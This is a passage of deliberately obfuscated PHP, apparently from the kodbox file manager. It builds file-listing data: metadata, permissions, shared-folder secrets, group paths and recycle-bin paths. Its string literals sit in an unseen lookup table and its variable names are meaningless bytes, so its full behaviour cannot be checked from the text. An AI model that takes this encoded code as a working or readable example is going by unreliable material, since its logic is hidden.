$this->_listAppendUser($ã‹ƒş†¯); $this->_listFilterInfo($ã‹ƒş†¯, $…å Çœ); $this->_listAppendAuthSecret($ã‹ƒş†¯); } protected function _listSourceCache($ËšÙ½­) { $ùÆÙ”‘ó =& $_SERVER[¼’ç§¼´]; foreach ($ËšÙ½­ as $ı÷ÊÍ ) { self::$cacheSourceInfo[$ùÆÙ”‘ó[544] . $ı÷ÊÍ [$ùÆÙ”‘ó[193]]] = $ı÷ÊÍ ; } } protected function _listFilterInfo(&$«§Ñğø–, $ñ¹…×Ç« = false) { $´ÇÆÆ =& $_SERVER[¼’ç§¼´]; foreach ($«§Ñğø– as &$Ûó‹öŠ) { $Ûó‹öŠ = $this->pathInfoFilter($Ûó‹öŠ); self::$cachePathInfo[$´ÇÆÆ[545] . intval($ñ¹…×Ç«) . $´ÇÆÆ[473] . $Ûó‹öŠ[$´ÇÆÆ[193]]] = $Ûó‹öŠ; } unset($Ûó‹öŠ); } protected function _listMake(&$ç¤­­â±) { $Íã³”‡ =& $_SERVER[¼’ç§¼´]; $ç¤­­â±[$Íã³”‡[85]] = array(); $ç¤­­â±[$Íã³”‡[86]] = array(); foreach ($ç¤­­â±[$Íã³”‡[456]] as $æ¾¦–) { $Ø´ÁÓ¨õ = $æ¾¦–[$Íã³”‡[496]] == 1 ? $Íã³”‡[85] : $Íã³”‡[86]; $ç¤­­â±[$Ø´ÁÓ¨õ][] = $æ¾¦–; } unset($ç¤­­â±[$Íã³”‡[456]]); } protected function _listAppendMeta(&$õ¬—ÈÎ¬, $¾¯ÔŞ•Ş) { $ıŒØ€ë =& $_SERVER[¼’ç§¼´]; $Ñ› ·ëì = array($ıŒØ€ë[502] => array($ıŒØ€ë[503], $¾¯ÔŞ•Ş)); $…šòöš½ = Model($ıŒØ€ë[546])->field($ıŒØ€ë[547])->where($Ñ› ·ëì)->select(); if (!$…šòöš½) { return; } $Œìœ× = array($ıŒØ€ë[548], $ıŒØ€ë[549], $ıŒØ€ë[528]); $öôşí´ = array(); foreach ($…šòöš½ as $Ìğ§ù) { if (!isset($öôşí´[$Ìğ§ù[$ıŒØ€ë[193]]])) { $öôşí´[$Ìğ§ù[$ıŒØ€ë[193]]] = array(); } if (in_array($Ìğ§ù[$ıŒØ€ë[97]], $Œìœ×)) { continue; } $öôşí´[$Ìğ§ù[$ıŒØ€ë[193]]][$Ìğ§ù[$ıŒØ€ë[97]]] = $Ìğ§ù[$ıŒØ€ë[461]]; } foreach ($õ¬—ÈÎ¬ as &$›Õò±) { $›Õò±[$ıŒØ€ë[550]] = !1; if (isset($öôşí´[$›Õò±[$ıŒØ€ë[193]]])) { $›Õò±[$ıŒØ€ë[550]] = $öôşí´[$›Õò±[$ıŒØ€ë[193]]]; } if ($this->fileIsLock($›Õò±) && $›Õò±[$ıŒØ€ë[498]]) { $±ÛÅòëÆ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $›Õò±[$ıŒØ€ë[498]][$ıŒØ€ë[499]] = AuthModel::authDisable($›Õò±[$ıŒØ€ë[498]][$ıŒØ€ë[499]], $±ÛÅòëÆ); $›Õò±[$ıŒØ€ë[498]][$ıŒØ€ë[551]][$ıŒØ€ë[498]] = $›Õò±[$ıŒØ€ë[498]][$ıŒØ€ë[499]]; } } unset($›Õò±); } protected function _listAppendFileMeta(&$ï£Ç°ä–, $‰ÑÉÂô‘) { $ÜĞ«ò¸ =& $_SERVER[¼’ç§¼´]; $¥Ğ¶ø¾ = array_to_keyvalue($ï£Ç°ä–, $ÜĞ«ò¸[12], $ÜĞ«ò¸[552]); $¥Ğ¶ø¾ = array_filter(array_unique($¥Ğ¶ø¾)); if (!$¥Ğ¶ø¾) { return; } $Æ£ñó©¤ = array($ÜĞ«ò¸[553] => array($ÜĞ«ò¸[503], $¥Ğ¶ø¾)); $É³ô¥ = $ÜĞ«ò¸[554]; $•å‘ºí = Model($ÜĞ«ò¸[555])->field($É³ô¥)->where($Æ£ñó©¤)->select(); $•å‘ºí = array_to_keyvalue($•å‘ºí, $ÜĞ«ò¸[552]); $—°¨š¼ì = Model($ÜĞ«ò¸[556])->field($ÜĞ«ò¸[557])->where($Æ£ñó©¤)->select(); $—°¨š¼ì = $—°¨š¼ì ? $—°¨š¼ì : array(); $ããÚü… = array(); foreach ($—°¨š¼ì as $ò Ø™õë) { if (!isset($ããÚü…[$ò Ø™õë[$ÜĞ«ò¸[552]]])) { $ããÚü…[$ò Ø™õë[$ÜĞ«ò¸[552]]] = array(); } $ããÚü…[$ò Ø™õë[$ÜĞ«ò¸[552]]][$ò Ø™õë[$ÜĞ«ò¸[97]]] = $ò Ø™õë[$ÜĞ«ò¸[461]]; } foreach ($ï£Ç°ä– as &$µ©¤úìÍ) { $í†˜³¨ = $µ©¤úìÍ[$ÜĞ«ò¸[552]]; if (!$í†˜³¨ || !is_array($•å‘ºí[$í†˜³¨])) { continue; } $ÕÅÉ“íí = $•å‘ºí[$í†˜³¨]; $ÕÅÉ“íí[$ÜĞ«ò¸[79]] = $µ©¤úìÍ[$ÜĞ«ò¸[79]]; $ÕÅÉ“íí[$ÜĞ«ò¸[32]] = $µ©¤úìÍ[$ÜĞ«ò¸[32]]; if (!$ÕÅÉ“íí[$ÜĞ«ò¸[558]]) { Model($ÜĞ«ò¸[555])->fileMd5Check($ÕÅÉ“íí); } if (!isset(self::$cacheFileInfo[$ÜĞ«ò¸[559] . $í†˜³¨])) { self::$cacheFileInfo[$ÜĞ«ò¸[559] . $í†˜³¨] = array_merge(array(), $ÕÅÉ“íí); } unset($•å‘ºí[$í†˜³¨][$ÜĞ«ò¸[87]]); $ö ÓâÖé = isset($ããÚü…[$í†˜³¨]) && is_array($ããÚü…[$í†˜³¨]) ? $ããÚü…[$í†˜³¨] : array(); $µ©¤úìÍ[$ÜĞ«ò¸[170]] = array_merge($ö ÓâÖé, $•å‘ºí[$í†˜³¨]); if (isset($µ©¤úìÍ[$ÜĞ«ò¸[170]][$ÜĞ«ò¸[184]])) { $µ©¤úìÍ[$ÜĞ«ò¸[184]] = json_decode($µ©¤úìÍ[$ÜĞ«ò¸[170]][$ÜĞ«ò¸[184]], !0); unset($µ©¤úìÍ[$ÜĞ«ò¸[170]][$ÜĞ«ò¸[184]]); } } unset($µ©¤úìÍ); } protected function _listAppendSourceInfo(&$€ô¢Ç¡, $ÁÕ èí…) { $å¬Ñšïç =& $_SERVER[¼’ç§¼´]; $ğŞ»­Åˆ = Model($å¬Ñšïç[560])->listData(); $ñÊÛ´åÑ = Model($å¬Ñšïç[510])->listData(); $¢ûÖ¯„ì = Model($å¬Ñšïç[500])->listData(); $âù£½¶ = Model($å¬Ñšïç[561])->listSimple(); $‚¬Ò“ÕÌ = array_to_keyvalue($ğŞ»­Åˆ, $å¬Ñšïç[486]); $ñ’¯ÒĞÌ = array_to_keyvalue_group($ñÊÛ´åÑ, $å¬Ñšïç[87], $å¬Ñšïç[511]); $Ï¶¡Å¯ê = array_to_keyvalue($¢ûÖ¯„ì, $å¬Ñšïç[87]); $º‹…ö = array_to_keyvalue_group($âù£½¶, $å¬Ñšïç[193]); foreach ($€ô¢Ç¡ as &$‰†¿º—) { $‰†¿º—[$å¬Ñšïç[90]] = array($å¬Ñšïç[562] => 0, $å¬Ñšïç[563] => 0, $å¬Ñšïç[564] => 0); if (isset($Ï¶¡Å¯ê[$‰†¿º—[$å¬Ñšïç[193]]])) { $‰†¿º—[$å¬Ñšïç[90]][$å¬Ñšïç[565]] = 1; $‰†¿º—[$å¬Ñšïç[90]][$å¬Ñšïç[566]] = $Ï¶¡Å¯ê[$‰†¿º—[$å¬Ñšïç[193]]][$å¬Ñšïç[32]]; } if ($ñ’¯ÒĞÌ && $‚¬Ò“ÕÌ && isset($ñ’¯ÒĞÌ[$‰†¿º—[$å¬Ñšïç[193]]])) { $‰†¿º—[$å¬Ñšïç[90]][$å¬Ñšïç[567]] = array(); foreach ($ñ’¯ÒĞÌ[$‰†¿º—[$å¬Ñšïç[193]]] as $È¥¥ä›–) { $¼Òßİ­ü = $‚¬Ò“ÕÌ[$È¥¥ä›–]; $‰†¿º—[$å¬Ñšïç[90]][$å¬Ñšïç[567]][] = array($å¬Ñšïç[568] => $¼Òßİ­ü[$å¬Ñšïç[486]], $å¬Ñšïç[505] => $¼Òßİ­ü[$å¬Ñšïç[32]], $å¬Ñšïç[569] => $¼Òßİ­ü[$å¬Ñšïç[570]]); } } if ($º‹…ö && isset($º‹…ö[$‰†¿º—[$å¬Ñšïç[193]]])) { $‰†¿º—[$å¬Ñšïç[90]][$å¬Ñšïç[571]] = array(); foreach ($º‹…ö[$‰†¿º—[$å¬Ñšïç[193]]] as $‰ä‚ù¾) { $ÕÓò­úò = $å¬Ñšïç[572]; if ($‰ä‚ù¾[$å¬Ñšïç[573]] == $å¬Ñšïç[91]) { $ÕÓò­úò .= $å¬Ñšïç[574]; } $‰†¿º—[$å¬Ñšïç[90]][$å¬Ñšïç[571]] = array_field_key($‰ä‚ù¾, explode($å¬Ñšïç[50], $ÕÓò­úò)); } } } unset($‰†¿º—); return $€ô¢Ç¡; } protected function _listAppendChildren(&$ÃÍ¦Ãæ, $ÁÈşïõÁ) { $”¢Ì­ãÆ =& $_SERVER[¼’ç§¼´]; $ıÂˆ»¢Ì = array(); $ğıüƒÆô = array($”¢Ì­ãÆ[241] => 0, $”¢Ì­ãÆ[242] => 0); foreach ($ÃÍ¦Ãæ as &$¤ÄÊìÕ´) { if (!$¤ÄÊìÕ´[$”¢Ì­ãÆ[496]]) { continue; } $ıÂˆ»¢Ì[] = $¤ÄÊìÕ´[$”¢Ì­ãÆ[193]]; } unset($¤ÄÊìÕ´); if (!$ıÂˆ»¢Ì) { return; } $ÓŞ½‡à× = array($”¢Ì­ãÆ[192] => array($”¢Ì­ãÆ[7], $ıÂˆ»¢Ì), $”¢Ì­ãÆ[516] => 0); $«¦§„–« = array($”¢Ì­ãÆ[192], $”¢Ì­ãÆ[496], $”¢Ì­ãÆ[575] => $”¢Ì­ãÆ[576]); $©•Ò‡Å² = $this->field($«¦§„–«)->where($ÓŞ½‡à×)->group($”¢Ì­ãÆ[577])->select(); $«Í¬›±« = array(); foreach ($©•Ò‡Å² as $ÍïµÊ¸Ì) { $¹ûâü ½ = $ÍïµÊ¸Ì[$”¢Ì­ãÆ[192]]; $£êüßÄÜ = $ÍïµÊ¸Ì[$”¢Ì­ãÆ[496]] == $”¢Ì­ãÆ[91] ? $”¢Ì­ãÆ[242] : $”¢Ì­ãÆ[241]; if (!isset($«Í¬›±«[$¹ûâü ½])) { $«Í¬›±«[$¹ûâü ½] = array($”¢Ì­ãÆ[241] => 0, $”¢Ì­ãÆ[242] => 0); } $«Í¬›±«[$¹ûâü ½][$£êüßÄÜ] += $ÍïµÊ¸Ì[$”¢Ì­ãÆ[576]]; } foreach ($ÃÍ¦Ãæ as &$¤ÄÊìÕ´) { if (!$¤ÄÊìÕ´[$”¢Ì­ãÆ[496]]) { continue; } $á˜Ş×Å¤ = is_array($«Í¬›±«[$¤ÄÊìÕ´[$”¢Ì­ãÆ[193]]]) ? $«Í¬›±«[$¤ÄÊìÕ´[$”¢Ì­ãÆ[193]]] : $ğıüƒÆô; $¤ÄÊìÕ´[$”¢Ì­ãÆ[242]] = $á˜Ş×Å¤[$”¢Ì­ãÆ[242]]; $¤ÄÊìÕ´[$”¢Ì­ãÆ[241]] = $á˜Ş×Å¤[$”¢Ì­ãÆ[241]]; unset($¤ÄÊìÕ´[$”¢Ì­ãÆ[497]]); } unset($¤ÄÊìÕ´); } protected function _listAppendAuth(&$›Î¤î) { $‡¹¡¬¢Ø =& $_SERVER[¼’ç§¼´]; $Ò›îçÒ = array(); foreach ($›Î¤î as $ÖÖ¶è¿‘) { if ($ÖÖ¶è¿‘[$‡¹¡¬¢Ø[190]] == self::TYPE_GROUP) { $Ò›îçÒ[] = $ÖÖ¶è¿‘[$‡¹¡¬¢Ø[193]]; } } if (!$Ò›îçÒ) { return; } $¾¡öµø¶ = array_to_keyvalue($›Î¤î, $‡¹¡¬¢Ø[193]); $ÑÑ¯ë¢› = Model($‡¹¡¬¢Ø[578])->getSourceList($Ò›îçÒ, $¾¡öµø¶); $ùÄ—ÉÖ÷ = KodUser::isRoot(); foreach ($›Î¤î as $Ê²‹Ìà¶ => &$ÖÖ¶è¿‘) { $ÖÖ¶è¿‘[$‡¹¡¬¢Ø[498]] = $ÑÑ¯ë¢›[$ÖÖ¶è¿‘[$‡¹¡¬¢Ø[193]]]; if (!$ÖÖ¶è¿‘[$‡¹¡¬¢Ø[498]] && $ÖÖ¶è¿‘[$‡¹¡¬¢Ø[190]] == self::TYPE_GROUP) { $ÖÖ¶è¿‘[$‡¹¡¬¢Ø[498]] = Action($‡¹¡¬¢Ø[579])->pathGroupAuthMake($ÖÖ¶è¿‘[$‡¹¡¬¢Ø[580]]); if (!$ÖÖ¶è¿‘[$‡¹¡¬¢Ø[498]] && !$ùÄ—ÉÖ÷) { $ÖÖ¶è¿‘[$‡¹¡¬¢Ø[235]] = !1; $ÖÖ¶è¿‘[$‡¹¡¬¢Ø[234]] = !1; } } if ($ÖÖ¶è¿‘[$‡¹¡¬¢Ø[498]]) { $ÖÖ¶è¿‘[$‡¹¡¬¢Ø[235]] = AuthModel::authCheckEdit($ÖÖ¶è¿‘[$‡¹¡¬¢Ø[498]][$‡¹¡¬¢Ø[499]]); $ÖÖ¶è¿‘[$‡¹¡¬¢Ø[234]] = AuthModel::authCheckView($ÖÖ¶è¿‘[$‡¹¡¬¢Ø[498]][$‡¹¡¬¢Ø[499]]); } $this->groupPathDisplay($ÖÖ¶è¿‘); } unset($ÖÖ¶è¿‘); } public function _listAppendAuthSecret(&$æÂÜ²Ä) { $ÙŠ¹½ÛÂ =& $_SERVER[¼’ç§¼´]; if (Model($ÙŠ¹½ÛÂ[519])->get($ÙŠ¹½ÛÂ[581]) != $ÙŠ¹½ÛÂ[91]) { return; } static $à°¯Ïõ = false; if (!$à°¯Ïõ) { $¿©ì³ä = Model($ÙŠ¹½ÛÂ[582]); $§­ÜÁµó = Model($ÙŠ¹½ÛÂ[583]); $à°¯Ïõ = $§­ÜÁµó->listData(); $à°¯Ïõ = array_to_keyvalue($à°¯Ïõ, $ÙŠ¹½ÛÂ[193]); $Ë“ËÚ’˜ = json_decode(Model($ÙŠ¹½ÛÂ[519])->get($ÙŠ¹½ÛÂ[584]), !0); $Ë“ËÚ’˜ = array_to_keyvalue($Ë“ËÚ’˜, $ÙŠ¹½ÛÂ[486]); foreach ($à°¯Ïõ as $»°Ö¾ı => $† çèõ˜) { $Â‚óÖŠÂ = $Ë“ËÚ’˜[$† çèõ˜[$ÙŠ¹½ÛÂ[585]]]; if (!$Â‚óÖŠÂ) { $§­ÜÁµó->remove($† çèõ˜[$ÙŠ¹½ÛÂ[486]]); unset($à°¯Ïõ[$»°Ö¾ı]); continue; } $í°ß»Ü¨ = $¿©ì³ä->listData($Â‚óÖŠÂ[$ÙŠ¹½ÛÂ[498]]); if (!$í°ß»Ü¨) { $§­ÜÁµó->remove($† çèõ˜[$ÙŠ¹½ÛÂ[486]]); unset($à°¯Ïõ[$»°Ö¾ı]); continue; } $† çèõ˜[$ÙŠ¹½ÛÂ[498]] = $í°ß»Ü¨; $† çèõ˜[$ÙŠ¹½ÛÂ[586]] = $Â‚óÖŠÂ; $† çèõ˜[$ÙŠ¹½ÛÂ[587]] = Model($ÙŠ¹½ÛÂ[588])->getInfoSimpleOuter($† çèõ˜[$ÙŠ¹½ÛÂ[538]]); $à°¯Ïõ[$»°Ö¾ı] = $† çèõ˜; } } $Õ¶­”â¦ = USER_ID; $¯½óÜƒ = array(); $›‘¦æòÖ = $this->_listAppendPath($¯½óÜƒ, !0); foreach ($æÂÜ²Ä as $»°Ö¾ı => &$† çèõ˜) { if (!is_array($† çèõ˜[$ÙŠ¹½ÛÂ[498]])) { continue; } if ($† çèõ˜[$ÙŠ¹½ÛÂ[190]] != $ÙŠ¹½ÛÂ[589]) { continue; } if (isset($à°¯Ïõ[$† çèõ˜[$ÙŠ¹½ÛÂ[193]]])) { $É¬¹şÃ = $à°¯Ïõ[$† çèõ˜[$ÙŠ¹½ÛÂ[193]]]; if (!is_array($† çèõ˜[$ÙŠ¹½ÛÂ[550]])) { $† çèõ˜[$ÙŠ¹½ÛÂ[550]] = array(); } $† çèõ˜[$ÙŠ¹½ÛÂ[550]][$ÙŠ¹½ÛÂ[590]] = $É¬¹şÃ[$ÙŠ¹½ÛÂ[585]]; $† çèõ˜[$ÙŠ¹½ÛÂ[498]][$ÙŠ¹½ÛÂ[591]] = $É¬¹şÃ; $† çèõ˜[$ÙŠ¹½ÛÂ[498]][$ÙŠ¹½ÛÂ[592]] = $† çèõ˜[$ÙŠ¹½ÛÂ[593]]; $† çèõ˜[$ÙŠ¹½ÛÂ[498]][$ÙŠ¹½ÛÂ[594]] = $ÙŠ¹½ÛÂ[91]; if ($É¬¹şÃ[$ÙŠ¹½ÛÂ[538]] != $Õ¶­”â¦) { $† çèõ˜[$ÙŠ¹½ÛÂ[498]][$ÙŠ¹½ÛÂ[499]] = $† çèõ˜[$ÙŠ¹½ÛÂ[498]][$ÙŠ¹½ÛÂ[499]] & $É¬¹şÃ[$ÙŠ¹½ÛÂ[498]][$ÙŠ¹½ÛÂ[498]]; } continue; } $×‡Ö˜¨¯ = $this->parentLevelArray($† çèõ˜[$ÙŠ¹½ÛÂ[595]]); $ëœû»ƒ = array_reverse($×‡Ö˜¨¯); foreach ($ëœû»ƒ as $«¦ôÒ½– => $·¿ÇãáÀ) { if (!isset($à°¯Ïõ[$·¿ÇãáÀ])) { continue; } $É¬¹şÃ = $à°¯Ïõ[$·¿ÇãáÀ]; $† çèõ˜[$ÙŠ¹½ÛÂ[498]][$ÙŠ¹½ÛÂ[591]] = $É¬¹şÃ; if ($É¬¹şÃ[$ÙŠ¹½ÛÂ[538]] != $Õ¶­”â¦) { $† çèõ˜[$ÙŠ¹½ÛÂ[498]][$ÙŠ¹½ÛÂ[499]] = $† çèõ˜[$ÙŠ¹½ÛÂ[498]][$ÙŠ¹½ÛÂ[499]] & $É¬¹şÃ[$ÙŠ¹½ÛÂ[498]][$ÙŠ¹½ÛÂ[498]]; } $ª©×ş¹Ö = $ÙŠ¹½ÛÂ[12]; $„ÒóáÇ  = count($×‡Ö˜¨¯) - $«¦ôÒ½–; for ($çıŠ…èÌ = 0; $çıŠ…èÌ < $„ÒóáÇ ; $çıŠ…èÌ++) { if (!isset($›‘¦æòÖ[$×‡Ö˜¨¯[$çıŠ…èÌ]])) { $ª©×ş¹Ö = $ÙŠ¹½ÛÂ[12]; break; } $ª©×ş¹Ö = $ª©×ş¹Ö . rtrim($›‘¦æòÖ[$×‡Ö˜¨¯[$çıŠ…èÌ]], $ÙŠ¹½ÛÂ[8]) . $ÙŠ¹½ÛÂ[8]; } $† çèõ˜[$ÙŠ¹½ÛÂ[498]][$ÙŠ¹½ÛÂ[592]] = rtrim($ª©×ş¹Ö, $ÙŠ¹½ÛÂ[8]) . $ÙŠ¹½ÛÂ[8]; break; } } unset($† çèõ˜); } public function groupPathDisplay(&$½í”‡æ) { $èôÉœÑ =& $_SERVER[¼’ç§¼´]; if ($½í”‡æ[$èôÉœÑ[190]] != self::TYPE_GROUP) { return; } $÷É ¶Å = Model($èôÉœÑ[596])->getInfo($½í”‡æ[$èôÉœÑ[580]]); $…‡¹Ôäœ = $this->parentLevelArray($÷É ¶Å[$èôÉœÑ[595]]); $É¨ùâ‘ = $èôÉœÑ[12]; foreach ($…‡¹Ôäœ as $¸Ûíóç) { $¯ô×üŠ† = Model($èôÉœÑ[596])->getInfo($¸Ûíóç); $É¨ùâ‘ .= $¯ô×üŠ†[$èôÉœÑ[90]][$èôÉœÑ[193]] . $èôÉœÑ[50]; } $½í”‡æ[$èôÉœÑ[597]] = $÷É ¶Å[$èôÉœÑ[192]]; $½í”‡æ[$èôÉœÑ[598]] = $÷É ¶Å[$èôÉœÑ[595]]; $½í”‡æ[$èôÉœÑ[599]] = $÷É ¶Å[$èôÉœÑ[600]]; $½í”‡æ[$èôÉœÑ[601]] = $É¨ùâ‘ . $÷É ¶Å[$èôÉœÑ[90]][$èôÉœÑ[193]]; } protected function _listAppendPath(&$À„ÔØÅ, $”ªåãíÈ = false) { $ŸÍÇ±¶Ê =& $_SERVER[¼’ç§¼´]; static $‚ŒÔìú‡ = array(); $Î„«èĞ– = array(); $Òê²ı²Ë = array(); if ($”ªåãíÈ) { return $‚ŒÔìú‡; } foreach ($À„ÔØÅ as &$Ãì¾ˆëÜ) { $Ô­øÉøŠ = $Ãì¾ˆëÜ[$ŸÍÇ±¶Ê[193]]; if ($Ãì¾ˆëÜ[$ŸÍÇ±¶Ê[496]] == $ŸÍÇ±¶Ê[91] && $Ãì¾ˆëÜ[$ŸÍÇ±¶Ê[192]] != 0) { $‚ŒÔìú‡[$Ô­øÉøŠ] = $Ãì¾ˆëÜ[$ŸÍÇ±¶Ê[32]]; } if ($Ãì¾ˆëÜ[$ŸÍÇ±¶Ê[496]] == $ŸÍÇ±¶Ê[91] && $Ãì¾ˆëÜ[$ŸÍÇ±¶Ê[192]] == 0) { $‚ŒÔìú‡[$Ô­øÉøŠ] = $this->_listAppendPathRoot($Ãì¾ˆëÜ, array()); } if (isset($Òê²ı²Ë[$Ãì¾ˆëÜ[$ŸÍÇ±¶Ê[595]]])) { continue; } $Òê²ı²Ë[$Ãì¾ˆëÜ[$ŸÍÇ±¶Ê[595]]] = !0; $¶ã¿Û¨… = $this->parentLevelArray($Ãì¾ˆëÜ[$ŸÍÇ±¶Ê[595]]); foreach ($¶ã¿Û¨… as $çè§ÂÉ÷ => $ŞÜ³Ôù¹) { if (isset($‚ŒÔìú‡[$ŞÜ³Ôù¹])) { continue; } if ($çè§ÂÉ÷ == 0) { $‚ŒÔìú‡[$ŞÜ³Ôù¹] = $this->_listAppendPathRoot($Ãì¾ˆëÜ, $¶ã¿Û¨…); } if ($çè§ÂÉ÷ != 0) { $Î„«èĞ–[] = $ŞÜ³Ôù¹; } } } unset($Ãì¾ˆëÜ); $Î„«èĞ– = array_unique($Î„«èĞ–); if (count($Î„«èĞ–) > 0) { $ª˜À âã = array($ŸÍÇ±¶Ê[502] => array($ŸÍÇ±¶Ê[503], $Î„«èĞ–)); if (count($Î„«èĞ–) == 1) { $Ê¢°”°˜ = $this->sourceInfo($Î„«èĞ–[0]); $¥¿åÓ”¹ = is_array($Ê¢°”°˜) ? array($Ê¢°”°˜) : !1; } else { $¥¿åÓ”¹ = $this->field($ŸÍÇ±¶Ê[602])->where($ª˜À âã)->select(); } if (!$¥¿åÓ”¹) { $¥¿åÓ”¹ = array(); } foreach ($¥¿åÓ”¹ as $ã¶È¿âí) { $‚ŒÔìú‡[$ã¶È¿âí[$ŸÍÇ±¶Ê[193]]] = $ã¶È¿âí[$ŸÍÇ±¶Ê[32]]; } } $ùé¦å´ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $â“ÆÅš‹ = array(); foreach ($À„ÔØÅ as &$Ãì¾ˆëÜ) { $áş·¹À = $Ãì¾ˆëÜ[$ŸÍÇ±¶Ê[595]]; $º˜¦Ã©œ = $ŸÍÇ±¶Ê[12]; if (isset($â“ÆÅš‹[$áş·¹À])) { $º˜¦Ã©œ = $â“ÆÅš‹[$áş·¹À]; } else { $¶ã¿Û¨… = $this->parentLevelArray($Ãì¾ˆëÜ[$ŸÍÇ±¶Ê[595]]); foreach ($¶ã¿Û¨… as $çè§ÂÉ÷ => $ŞÜ³Ôù¹) { if (isset($‚ŒÔìú‡[$ŞÜ³Ôù¹])) { $º˜¦Ã©œ .= $‚ŒÔìú‡[$ŞÜ³Ôù¹] . $ŸÍÇ±¶Ê[8]; } } $â“ÆÅš‹[$áş·¹À] = $º˜¦Ã©œ; } $º˜¦Ã©œ .= $Ãì¾ˆëÜ[$ŸÍÇ±¶Ê[32]]; if ($Ãì¾ˆëÜ[$ŸÍÇ±¶Ê[496]] == $ŸÍÇ±¶Ê[91]) { $º˜¦Ã©œ .= $ŸÍÇ±¶Ê[8]; } $Ãì¾ˆëÜ[$ŸÍÇ±¶Ê[593]] = str_replace($ŸÍÇ±¶Ê[256], $ŸÍÇ±¶Ê[8], $º˜¦Ã©œ); if ($Ãì¾ˆëÜ[$ŸÍÇ±¶Ê[192]] == $ŸÍÇ±¶Ê[230]) { $Ãì¾ˆëÜ[$ŸÍÇ±¶Ê[32]] = trim($‚ŒÔìú‡[$Ãì¾ˆëÜ[$ŸÍÇ±¶Ê[193]]], $ŸÍÇ±¶Ê[8]); $Ãì¾ˆëÜ[$ŸÍÇ±¶Ê[593]] = $Ãì¾ˆëÜ[$ŸÍÇ±¶Ê[32]] . $ŸÍÇ±¶Ê[8]; } if (intval($Ãì¾ˆëÜ[$ŸÍÇ±¶Ê[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Ãì¾ˆëÜ, $¶ã¿Û¨…, $ùé¦å´); } } unset($Ãì¾ˆëÜ); return $À„ÔØÅ; } private function _listAppendPathRecycle(&$ú¯¥‡à™, $é±í‹ÀÄ, $Ÿ«ëüƒ) { $‘µÄâÃË =& $_SERVER[¼’ç§¼´]; if (!in_array($Ÿ«ëüƒ, $é±í‹ÀÄ) && $ú¯¥‡à™[$‘µÄâÃË[193]] != $Ÿ«ëüƒ) { return; } $„™ô–ª˜ = explode($‘µÄâÃË[8], trim($ú¯¥‡à™[$‘µÄâÃË[593]], $‘µÄâÃË[8])); $Ëäš½³Ÿ = implode($‘µÄâÃË[8], array_slice($„™ô–ª˜, 2)); $ú¯¥‡à™[$‘µÄâÃË[593]] = $‘µÄâÃË[8] . LNG($‘µÄâÃË[603]) . $‘µÄâÃË[8] . ltrim($Ëäš½³Ÿ, $‘µÄâÃË[8]); $ú¯¥‡à™[$‘µÄâÃË[595]] = $‘µÄâÃË[604] . implode($‘µÄâÃË[50], array_slice($é±í‹ÀÄ, 1)) . $‘µÄâÃË[50]; if ($ú¯¥‡à™[$‘µÄâÃË[193]] == $Ÿ«ëüƒ) { $ú¯¥‡à™[$‘µÄâÃË[595]] = $‘µÄâÃË[604]; $ú¯¥‡à™[$‘µÄâÃË[192]] = $‘µÄâÃË[230]; $ú¯¥‡à™[$‘µÄâÃË[32]] = LNG($‘µÄâÃË[603]); } $ú¯¥‡à™[$‘µÄâÃË[605]] = $‘µÄâÃË[606]; } protected function _listAppendPathRoot(&$üÀ®íí‹, $…¹Ë†³Ì) { $È€ú‘‡Ø =& $_SERVER[¼’ç§¼´]; static $ÁÊ½œ ñ = false; static $òø’ü‡ï = false; $û¬£¢ãÙ = $È€ú‘‡Ø[12]; if ($üÀ®íí‹[$È€ú‘‡Ø[190]] == self::TYPE_USER) { if ($üÀ®íí‹[$È€ú‘‡Ø[580]] == USER_ID) { $û¬£¢ãÙ = LNG($È€ú‘‡Ø[607]); if ($ÁÊ½œ ñ === !1) { $âú¶¥¿Ù = Model($È€ú‘‡Ø[608])->getInfoFull(USER_ID); $ÁÊ½œ ñ = _get($âú¶¥¿Ù, $È€ú‘‡Ø[609], $È€ú‘‡Ø[12]); } if ($òø’ü‡ï === !1) { $âú¶¥¿Ù = Model($È€ú‘‡Ø[608])->getInfoFull(USER_ID); $òø’ü‡ï = _get($âú¶¥¿Ù, $È€ú‘‡Ø[610], $È€ú‘‡Ø[12]); } if ($…¹Ë†³Ì && $…¹Ë†³Ì[0] == $ÁÊ½œ ñ || !$…¹Ë†³Ì && $üÀ®íí‹[$È€ú‘‡Ø[193]] == $ÁÊ½œ ñ) { $û¬£¢ãÙ = LNG($È€ú‘‡Ø[611]); $üÀ®íí‹[$È€ú‘‡Ø[612]] = $È€ú‘‡Ø[613]; } if ($…¹Ë†³Ì && $…¹Ë†³Ì[0] == $òø’ü‡ï || !$…¹Ë†³Ì && $üÀ®íí‹[$È€ú‘‡Ø[193]] == $òø’ü‡ï) { $û¬£¢ãÙ = $û¬£¢ãÙ . $È€ú‘‡Ø[614] . LNG($È€ú‘‡Ø[615]); } if (!$…¹Ë†³Ì) { $üÀ®íí‹[$È€ú‘‡Ø[32]] = $û¬£¢ãÙ; } } else { $âú¶¥¿Ù = Model($È€ú‘‡Ø[608])->getInfoFull($üÀ®íí‹[$È€ú‘‡Ø[580]]); $…ôè·“† = _get($âú¶¥¿Ù, $È€ú‘‡Ø[610], $È€ú‘‡Ø[12]); $üÀ®íí‹[$È€ú‘‡Ø[616]] = Model($È€ú‘‡Ø[588])->getInfoSimpleOuter($üÀ®íí‹[$È€ú‘‡Ø[580]]); $û¬£¢ãÙ = LNG($È€ú‘‡Ø[617]) . $È€ú‘‡Ø[176] . $üÀ®íí‹[$È€ú‘‡Ø[616]][$È€ú‘‡Ø[32]] . $È€ú‘‡Ø[178]; if ($…¹Ë†³Ì && $…¹Ë†³Ì[0] == $…ôè·“† || !$…¹Ë†³Ì && $üÀ®íí‹[$È€ú‘‡Ø[193]] == $…ôè·“†) { $û¬£¢ãÙ = LNG($È€ú‘‡Ø[617]) . $È€ú‘‡Ø[618] . $üÀ®íí‹[$È€ú‘‡Ø[616]][$È€ú‘‡Ø[32]] . $È€ú‘‡Ø[614] . LNG($È€ú‘‡Ø[615]) . $È€ú‘‡Ø[178]; } } } else { if ($üÀ®íí‹[$È€ú‘‡Ø[190]] == self::TYPE_GROUP) { $ò‚êá = Model($È€ú‘‡Ø[596])->getInfoSimple($üÀ®íí‹[$È€ú‘‡Ø[580]]); $û¬£¢ãÙ = $ò‚êá[$È€ú‘‡Ø[32]]; } else { if ($üÀ®íí‹[$È€ú‘‡Ø[190]] == self::TYPE_SYSTEM) { $û¬£¢ãÙ = 